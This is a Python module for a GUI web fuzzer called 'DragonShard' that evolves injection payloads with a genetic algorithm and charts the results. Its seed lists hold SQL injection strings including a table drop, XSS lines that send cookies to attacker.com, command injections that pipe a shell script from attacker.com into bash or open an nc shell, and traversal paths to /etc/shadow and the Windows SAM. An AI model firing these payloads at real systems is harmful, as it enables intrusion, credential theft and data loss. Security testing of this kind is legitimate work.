#!/usr/bin/env python3
"""
Web Fuzzing Visualization Module

Provides real-time visualization of genetic algorithm fuzzing against websites
with mutation tree tracking and vulnerability discovery.
"""

import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
import requests
import json
import logging
from typing import List, Dict, Any, Optional, Set
import queue
from dataclasses import dataclass
from datetime import datetime

import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure
import networkx as nx
import numpy as np

from ..fuzzing import GeneticMutator, GeneticPayload, PayloadType, ResponseAnalyzer
from ..fuzzing.fuzzer import Fuzzer, FuzzResult

# Set up logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


@dataclass
class MutationNode:
    """Represents a node in the mutation tree."""
    payload: str
    parent_payload: Optional[str]
    generation: int
    fitness: float
    vulnerability_score: float
    mutation_type: str
    response_analysis: Optional[Dict[str, Any]] = None
    children: List[str] = None
    timestamp: datetime = None

    def __post_init__(self):
        if self.children is None:
            self.children = []
        if self.timestamp is None:
            self.timestamp = datetime.now()


class WebFuzzingVisualizer:
    """Real-time visualization of web fuzzing with genetic algorithms."""

    def __init__(self, root: tk.Tk):
        """Initialize the web fuzzing visualizer."""
        self.root = root
        self.root.title("DragonShard - Web Fuzzing Visualizer")
        self.root.geometry("1400x900")

        # Data storage
        self.mutation_tree: Dict[str, MutationNode] = {}
        self.generation_data = []
        self.fitness_history = []
        self.vulnerability_history = []
        self.fuzzing_results: List[FuzzResult] = []

        # Threading
        self.update_queue = queue.Queue()
        self.running = False
        self.mutator = None
        self.fuzzer = None
        self.fitness_function = None

        # Setup UI
        self.setup_ui()
        self.setup_charts()
        self.setup_mutation_tree()

        # Start update thread
        self.update_thread = threading.Thread(target=self.update_loop, daemon=True)
        self.update_thread.start()

    def setup_ui(self):
        """Setup the main user interface."""
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Control panel
        control_frame = ttk.LabelFrame(main_frame, text="Web Fuzzing Controls", padding=10)
        control_frame.pack(fill=tk.X, pady=(0, 10))

        # Target URL
        ttk.Label(control_frame, text="Target URL:").grid(row=0, column=0, sticky=tk.W, padx=(0, 5))
        self.url_var = tk.StringVar(value="http://localhost:8082")
        self.url_entry = ttk.Entry(control_frame, textvariable=self.url_var, width=50)
        self.url_entry.grid(row=0, column=1, padx=(0, 10))

        # Payload type
        ttk.Label(control_frame, text="Payload Type:").grid(row=0, column=2, sticky=tk.W, padx=(0, 5))
        self.payload_type_var = tk.StringVar(value="SQL_INJECTION")
        payload_type_combo = ttk.Combobox(
            control_frame,
            textvariable=self.payload_type_var,
            values=["SQL_INJECTION", "XSS", "COMMAND_INJECTION", "PATH_TRAVERSAL", "LFI", "RFI", "XXE", "SSRF"],
            state="readonly",
            width=15,
        )
        payload_type_combo.grid(row=0, column=3, padx=(0, 10))

        # HTTP Method
        ttk.Label(control_frame, text="Method:").grid(row=0, column=4, sticky=tk.W, padx=(0, 5))
        self.method_var = tk.StringVar(value="GET")
        method_combo = ttk.Combobox(
            control_frame,
            textvariable=self.method_var,
            values=["GET", "POST", "PUT", "DELETE"],
            state="readonly",
            width=8,
        )
        method_combo.grid(row=0, column=5, padx=(0, 10))

        # Start/Stop button
        self.start_button = ttk.Button(
            control_frame, text="Start Web Fuzzing", command=self.start_fuzzing
        )
        self.start_button.grid(row=0, column=6, padx=(0, 10))

        # Status
        self.status_var = tk.StringVar(value="Ready")
        status_label = ttk.Label(control_frame, textvariable=self.status_var, foreground="blue")
        status_label.grid(row=0, column=7, padx=(10, 0))

        # Progress bar
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(
            control_frame, variable=self.progress_var, maximum=100, length=200
        )
        self.progress_bar.grid(row=1, column=0, columnspan=8, sticky=(tk.W, tk.E), pady=(10, 0))

        # Charts and tree frame
        content_frame = ttk.Frame(main_frame)
        content_frame.pack(fill=tk.BOTH, expand=True)

        # Left panel - Charts
        left_frame = ttk.Frame(content_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # Fitness chart
        fitness_frame = ttk.LabelFrame(left_frame, text="Fitness Evolution", padding=5)
        fitness_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))

        # Vulnerability chart
        vuln_frame = ttk.LabelFrame(left_frame, text="Vulnerability Discovery", padding=5)
        vuln_frame.pack(fill=tk.BOTH, expand=True)

        # Right panel - Mutation Tree and Results
        right_frame = ttk.Frame(content_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, padx=(10, 0))

        # Mutation tree
        tree_frame = ttk.LabelFrame(right_frame, text="Mutation Tree", padding=5)
        tree_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))

        # Results frame
        results_frame = ttk.LabelFrame(right_frame, text="Fuzzing Results", padding=5)
        results_frame.pack(fill=tk.BOTH, expand=True)

        # Store frame references
        self.fitness_frame = fitness_frame
        self.vuln_frame = vuln_frame
        self.tree_frame = tree_frame
        self.results_frame = results_frame

    def setup_charts(self):
        """Setup matplotlib charts."""
        # Fitness chart
        self.fitness_fig = Figure(figsize=(6, 3), dpi=100)
        self.fitness_ax = self.fitness_fig.add_subplot(111)
        self.fitness_ax.set_title("Fitness Evolution")
        self.fitness_ax.set_xlabel("Generation")
        self.fitness_ax.set_ylabel("Fitness Score")
        self.fitness_canvas = FigureCanvasTkAgg(self.fitness_fig, self.fitness_frame)
        self.fitness_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)

        # Vulnerability chart
        self.vuln_fig = Figure(figsize=(6, 3), dpi=100)
        self.vuln_ax = self.vuln_fig.add_subplot(111)
        self.vuln_ax.set_title("Vulnerability Discovery")
        self.vuln_ax.set_xlabel("Generation")
        self.vuln_ax.set_ylabel("Vulnerability Score")
        self.vuln_canvas = FigureCanvasTkAgg(self.vuln_fig, self.vuln_frame)
        self.vuln_canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)

    def setup_mutation_tree(self):
        """Setup the mutation tree visualization."""
        # Create tree canvas
        self.tree_canvas = tk.Canvas(self.tree_frame, bg="white", width=400, height=300)
        self.tree_canvas.pack(fill=tk.BOTH, expand=True)

        # Results text widget
        self.results_text = tk.Text(self.results_frame, height=15, width=60)
        results_scrollbar = ttk.Scrollbar(
            self.results_frame, orient=tk.VERTICAL, command=self.results_text.yview
        )
        self.results_text.configure(yscrollcommand=results_scrollbar.set)

        self.results_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        results_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    def start_fuzzing(self):
        """Start the web fuzzing process."""
        if self.running:
            self.stop_fuzzing()
            return

        try:
            # Get parameters
            target_url = self.url_var.get()
            payload_type_str = self.payload_type_var.get()
            method = self.method_var.get()
            payload_type = PayloadType[payload_type_str]

            # Initialize components
            self.mutator = GeneticMutator(
                population_size=20,
                mutation_rate=0.2,
                crossover_rate=0.8,
                max_generations=15,
                response_analyzer=ResponseAnalyzer(),
                target_url=target_url,
            )

            self.fuzzer = Fuzzer(timeout=10, max_retries=3, delay=0.1)

            # Base payloads
            base_payloads = self.get_base_payloads(payload_type)

            # Initialize population
            self.mutator.initialize_population(base_payloads, payload_type)

            # Create fitness function
            self.fitness_function = self.create_web_fitness_function(target_url, method)

            # Start fuzzing in separate thread
            self.running = True
            self.start_button.config(text="Stop Fuzzing")
            self.status_var.set(f"Fuzzing {target_url}...")
            self.progress_var.set(0)

            fuzzing_thread = threading.Thread(target=self.run_fuzzing, daemon=True)
            fuzzing_thread.start()

        except Exception as e:
            messagebox.showerror("Error", f"Failed to start fuzzing: {e}")

    def stop_fuzzing(self):
        """Stop the fuzzing process."""
        self.running = False
        self.start_button.config(text="Start Web Fuzzing")
        self.status_var.set("Stopped")

    def get_base_payloads(self, payload_type: PayloadType) -> List[str]:
        """Get base payloads for web fuzzing."""
        if payload_type == PayloadType.SQL_INJECTION:
            return [
                "1' OR '1'='1",
                "admin'--",
                "1' UNION SELECT 1,2,3--",
                "1' AND 1=1--",
                "1' OR 1=1#",
                "'; DROP TABLE users--",
                "' UNION SELECT username,password FROM users--",
                "' OR 'x'='x",
                "admin' OR '1'='1'--",
                "1' AND (SELECT COUNT(*) FROM users)>0--",
            ]
        elif payload_type == PayloadType.XSS:
            return [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
                "<svg><script>alert(1)</script></svg>",
            ]
        elif payload_type == PayloadType.COMMAND_INJECTION:
            return [
                "127.0.0.1; ls",
                "127.0.0.1 && whoami",
                "127.0.0.1 | cat /etc/passwd",
                "127.0.0.1; id",
                "127.0.0.1 && pwd",
                "127.0.0.1; uname -a",
                "127.0.0.1 && cat /etc/shadow",
                "127.0.0.1; wget http://attacker.com/shell.sh",
                "127.0.0.1 && curl http://attacker.com/shell.sh | bash",
                "127.0.0.1; nc -l 4444 -e /bin/sh",
            ]
        elif payload_type == PayloadType.PATH_TRAVERSAL:
            return [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
                "../../../etc/shadow",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/hosts",
                "..%2F..%2F..%2Fetc%2Fshadow",
                "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam",
            ]
        else:
            return ["test"]

    def create_web_fitness_function(self, target_url: str, method: str):
        """Create a fitness function for web fuzzing."""

        def fitness_function(payload: GeneticPayload) -> float:
            try:
                # Add delay for visualization
                time.sleep(0.1)

                # Make HTTP request
                try:
                    if method.upper() == "GET":
                        response = requests.get(
                            f"{target_url}?input={payload.payload}",
                            timeout=5,
                            headers={"User-Agent": "DragonShard/1.0"},
                        )
                    else:
                        response = requests.post(
                            target_url,
                            data={"input": payload.payload},
                            timeout=5,
                            headers={"User-Agent": "DragonShard/1.0"},
                        )

                    # Analyze response for vulnerabilities
                    fitness = 0.0
                    vulnerability_score = 0.0

                    # Status code analysis
                    if response.status_code >= 500:
                        fitness += 0.4
                        vulnerability_score += 0.6
                    elif response.status_code == 200:
                        fitness += 0.2

                    # Content analysis
                    content = response.text.lower()
                    
                    # SQL Injection indicators
                    if any(indicator in content for indicator in ["sql", "mysql", "postgresql", "oracle", "syntax error"]):
                        fitness += 0.3
                        vulnerability_score += 0.8

                    # XSS indicators
                    if any(indicator in content for indicator in ["alert", "script", "javascript"]):
                        fitness += 0.2
                        vulnerability_score += 0.5

                    # Command injection indicators
                    if any(indicator in content for indicator in ["root:", "uid=", "gid=", "drwx"]):
                        fitness += 0.3
                        vulnerability_score += 0.7

                    # Path traversal indicators
                    if any(indicator in content for indicator in ["root:x:", "bin:x:", "daemon:x:"]):
                        fitness += 0.3
                        vulnerability_score += 0.7

                    # Response time analysis
                    if response.elapsed.total_seconds() > 1.0:
                        fitness += 0.1

                    # Length analysis
                    if len(response.text) > 10000:
                        fitness += 0.1

                    # Store result
                    fuzz_result = FuzzResult(
                        url=target_url,
                        method=method,
                        payload=payload.payload,
                        payload_type=payload.payload_type.value,
                        status_code=response.status_code,
                        response_time=response.elapsed.total_seconds(),
                        response_size=len(response.content),
                        response_headers=dict(response.headers),
                        response_body=response.text,
                        is_vulnerable=vulnerability_score > 0.5,
                        vulnerability_type=self.detect_vulnerability_type(content),
                        confidence=vulnerability_score,
                        evidence=self.generate_evidence(content, response.status_code),
                    )
                    self.fuzzing_results.append(fuzz_result)

                    # Update payload with response analysis
                    payload.vulnerability_score = vulnerability_score
                    payload.response_analysis = {
                        "status_code": response.status_code,
                        "response_time": response.elapsed.total_seconds(),
                        "response_size": len(response.content),
                        "vulnerability_score": vulnerability_score,
                    }

                    return min(fitness, 1.0)

                except requests.exceptions.RequestException as e:
                    logger.debug(f"Request failed: {e}")
                    return 0.0

            except Exception as e:
                logger.debug(f"Fitness evaluation error: {e}")
                return 0.0

        return fitness_function

    def detect_vulnerability_type(self, content: str) -> Optional[str]:
        """Detect vulnerability type from response content."""
        content_lower = content.lower()
        
        if any(indicator in content_lower for indicator in ["sql", "mysql", "postgresql", "oracle", "syntax error"]):
            return "SQL Injection"
        elif any(indicator in content_lower for indicator in ["alert", "script", "javascript"]):
            return "XSS"
        elif any(indicator in content_lower for indicator in ["root:", "uid=", "gid=", "drwx"]):
            return "Command Injection"
        elif any(indicator in content_lower for indicator in ["root:x:", "bin:x:", "daemon:x:"]):
            return "Path Traversal"
        else:
            return None

    def generate_evidence(self, content: str, status_code: int) -> str:
        """Generate evidence for vulnerability detection."""
        evidence = []
        
        if status_code >= 500:
            evidence.append(f"Server error (HTTP {status_code})")
        
        content_lower = content.lower()
        if "sql" in content_lower:
            evidence.append("SQL error message detected")
        if "alert" in content_lower:
            evidence.append("JavaScript alert detected")
        if "root:" in content_lower:
            evidence.append("System file contents detected")
        
        return "; ".join(evidence) if evidence else "Anomalous response"

    def run_fuzzing(self):
        """Run the fuzzing process."""
        try:
            total_generations = self.mutator.max_generations
            
            for generation in range(total_generations):
                if not self.running:
                    break

                # Evolve population
                best_payloads = self.mutator.evolve(self.fitness_function)

                # Update mutation tree
                self.update_mutation_tree(best_payloads, generation)

                # Update data for visualization
                generation_data = {
                    "generation": generation,
                    "best_fitness": max(p.fitness for p in best_payloads) if best_payloads else 0.0,
                    "avg_fitness": sum(p.fitness for p in best_payloads) / len(best_payloads) if best_payloads else 0.0,
                    "population_size": len(best_payloads),
                    "best_payloads": best_payloads[:5],
                    "vulnerabilities_found": len([p for p in best_payloads if p.vulnerability_score > 0.5]),
                    "avg_vulnerability_score": sum(p.vulnerability_score for p in best_payloads) / len(best_payloads) if best_payloads else 0.0,
                }

                # Update progress
                progress = ((generation + 1) / total_generations) * 100
                self.progress_var.set(progress)

                # Queue update for UI thread
                self.update_queue.put(generation_data)

                # Update generation counter
                self.mutator.generation = generation + 1

        except Exception as e:
            logger.error(f"Fuzzing error: {e}")
        finally:
            self.running = False
            self.root.after(0, lambda: self.stop_fuzzing())

    def update_mutation_tree(self, payloads: List[GeneticPayload], generation: int):
        """Update the mutation tree with new payloads."""
        for payload in payloads:
            # Create mutation node
            node = MutationNode(
                payload=payload.payload,
                parent_payload=None,  # Would need to track parent-child relationships
                generation=generation,
                fitness=payload.fitness,
                vulnerability_score=payload.vulnerability_score,
                mutation_type=self.classify_mutation_type(payload),
                response_analysis=payload.response_analysis,
            )
            
            # Add to tree
            self.mutation_tree[payload.payload] = node

    def classify_mutation_type(self, payload: GeneticPayload) -> str:
        """Classify the type of mutation applied to a payload."""
        if payload.payload_type == PayloadType.XSS:
            if any(encoding in payload.payload for encoding in ["&lt;", "&gt;", "%3C", "%3E"]):
                return "encoding"
            elif "<" in payload.payload and ">" in payload.payload:
                return "tag"
            else:
                return "general"
        elif payload.payload_type == PayloadType.SQL_INJECTION:
            if any(op in payload.payload.upper() for op in ["UNION", "SELECT", "OR", "AND"]):
                return "keyword"
            else:
                return "general"
        else:
            return "general"

    def update_loop(self):
        """Update loop for real-time visualization."""
        while True:
            try:
                # Get data from queue
                data = self.update_queue.get(timeout=0.1)

                # Update UI in main thread
                self.root.after(0, lambda d=data: self.update_visualization(d))

            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Update loop error: {e}")

    def update_visualization(self, data: Dict[str, Any]):
        """Update the visualization with new data."""
        # Update charts
        self.update_fitness_chart(data)
        self.update_vulnerability_chart(data)
        self.update_mutation_tree_viz()
        self.update_results_display()

    def update_fitness_chart(self, data: Dict[str, Any]):
        """Update the fitness evolution chart."""
        self.generation_data.append(data["generation"])
        self.fitness_history.append(data["best_fitness"])

        # Clear and redraw
        self.fitness_ax.clear()
        self.fitness_ax.plot(self.generation_data, self.fitness_history, "b-", linewidth=2)
        self.fitness_ax.set_title("Fitness Evolution")
        self.fitness_ax.set_xlabel("Generation")
        self.fitness_ax.set_ylabel("Fitness Score")
        self.fitness_ax.grid(True, alpha=0.3)

        # Update canvas
        if self.fitness_canvas:
            self.fitness_canvas.draw()

    def update_vulnerability_chart(self, data: Dict[str, Any]):
        """Update the vulnerability discovery chart."""
        self.vulnerability_history.append(data["avg_vulnerability_score"])

        # Clear and redraw
        self.vuln_ax.clear()
        self.vuln_ax.plot(self.generation_data, self.vulnerability_history, "r-", linewidth=2)
        self.vuln_ax.set_title("Vulnerability Discovery")
        self.vuln_ax.set_xlabel("Generation")
        self.vuln_ax.set_ylabel("Vulnerability Score")
        self.vuln_ax.grid(True, alpha=0.3)

        # Update canvas
        if self.vuln_canvas:
            self.vuln_canvas.draw()

    def update_mutation_tree_viz(self):
        """Update the mutation tree visualization."""
        # Clear canvas
        self.tree_canvas.delete("all")

        if not self.mutation_tree:
            return

        # Create networkx graph for visualization
        G = nx.DiGraph()
        
        # Add nodes
        for payload, node in self.mutation_tree.items():
            G.add_node(payload, 
                      generation=node.generation,
                      fitness=node.fitness,
                      vulnerability_score=node.vulnerability_score)

        # Add edges (simplified - would need proper parent-child tracking)
        nodes = list(self.mutation_tree.keys())
        for i in range(len(nodes) - 1):
            G.add_edge(nodes[i], nodes[i + 1])

        # Draw the graph
        pos = nx.spring_layout(G, k=1, iterations=50)
        
        # Draw nodes
        for node in G.nodes():
            node_data = G.nodes[node]
            x, y = pos[node]
            
            # Node color based on vulnerability score
            vuln_score = node_data.get('vulnerability_score', 0)
            if vuln_score > 0.7:
                color = "red"
            elif vuln_score > 0.4:
                color = "orange"
            else:
                color = "lightblue"
            
            # Draw node
            canvas_x = (x + 1) * 200
            canvas_y = (y + 1) * 150
            
            self.tree_canvas.create_oval(
                canvas_x - 10, canvas_y - 10,
                canvas_x + 10, canvas_y + 10,
                fill=color, outline="black"
            )
            
            # Add label
            self.tree_canvas.create_text(
                canvas_x, canvas_y + 20,
                text=f"Gen {node_data.get('generation', 0)}",
                font=("Arial", 8)
            )

        # Draw edges
        for edge in G.edges():
            start_node = edge[0]
            end_node = edge[1]
            
            start_x, start_y = pos[start_node]
            end_x, end_y = pos[end_node]
            
            start_canvas_x = (start_x + 1) * 200
            start_canvas_y = (start_y + 1) * 150
            end_canvas_x = (end_x + 1) * 200
            end_canvas_y = (end_y + 1) * 150
            
            self.tree_canvas.create_line(
                start_canvas_x, start_canvas_y,
                end_canvas_x, end_canvas_y,
                fill="gray", width=1
            )

    def update_results_display(self):
        """Update the results display."""
        self.results_text.delete(1.0, tk.END)
        
        # Show vulnerabilities found
        vulnerabilities = [r for r in self.fuzzing_results if r.is_vulnerable]
        
        if vulnerabilities:
            self.results_text.insert(tk.END, f"🔴 VULNERABILITIES FOUND: {len(vulnerabilities)}\n")
            self.results_text.insert(tk.END, "=" * 50 + "\n\n")
            
            for i, vuln in enumerate(vulnerabilities[:10], 1):  # Show top 10
                self.results_text.insert(tk.END, f"{i}. {vuln.vulnerability_type or 'Unknown'}\n")
                self.results_text.insert(tk.END, f"   Payload: {vuln.payload[:50]}...\n")
                self.results_text.insert(tk.END, f"   Evidence: {vuln.evidence}\n")
                self.results_text.insert(tk.END, f"   Confidence: {vuln.confidence:.2f}\n")
                self.results_text.insert(tk.END, f"   Status: {vuln.status_code}\n\n")
        else:
            self.results_text.insert(tk.END, "✅ No vulnerabilities detected yet...\n")
            self.results_text.insert(tk.END, "=" * 50 + "\n\n")
            
            # Show recent results
            recent_results = self.fuzzing_results[-10:] if self.fuzzing_results else []
            for i, result in enumerate(recent_results, 1):
                self.results_text.insert(tk.END, f"{i}. {result.payload[:50]}...\n")
                self.results_text.insert(tk.END, f"   Status: {result.status_code} | Score: {result.confidence:.2f}\n\n")

    def export_results(self, filename: str = None):
        """Export fuzzing results to a file."""
        if filename is None:
            filename = f"web_fuzzing_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        export_data = {
            "timestamp": datetime.now().isoformat(),
            "target_url": self.url_var.get(),
            "payload_type": self.payload_type_var.get(),
            "method": self.method_var.get(),
            "total_results": len(self.fuzzing_results),
            "vulnerabilities_found": len([r for r in self.fuzzing_results if r.is_vulnerable]),
            "mutation_tree_size": len(self.mutation_tree),
            "results": [r.__dict__ for r in self.fuzzing_results],
            "mutation_tree": {
                payload: {
                    "generation": node.generation,
                    "fitness": node.fitness,
                    "vulnerability_score": node.vulnerability_score,
                    "mutation_type": node.mutation_type,
                    "timestamp": node.timestamp.isoformat(),
                }
                for payload, node in self.mutation_tree.items()
            }
        }
        
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        logger.info(f"Results exported to {filename}")


def main():
    """Main function to run the web fuzzing visualizer."""
    root = tk.Tk()
    app = WebFuzzingVisualizer(root)
    root.mainloop()


if __name__ == "__main__":
    main() 